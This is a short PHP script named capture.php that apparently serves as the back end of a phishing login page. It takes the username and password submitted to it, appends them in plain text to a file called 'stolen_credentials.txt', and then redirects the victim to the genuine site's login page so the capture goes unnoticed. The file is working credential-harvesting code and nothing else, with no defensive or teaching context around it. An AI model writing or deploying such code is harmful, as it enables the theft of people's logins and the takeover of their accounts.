<?php
// capture.php
$username = $_POST['username'];
$password = $_POST['password'];
file_put_contents('stolen_credentials.txt', "Username: $username | Password: $password\n", FILE_APPEND);

// Redirect user after capturing data, maybe to the real site's login page
header("Location: http://real-website.com/login");
exit;
?>

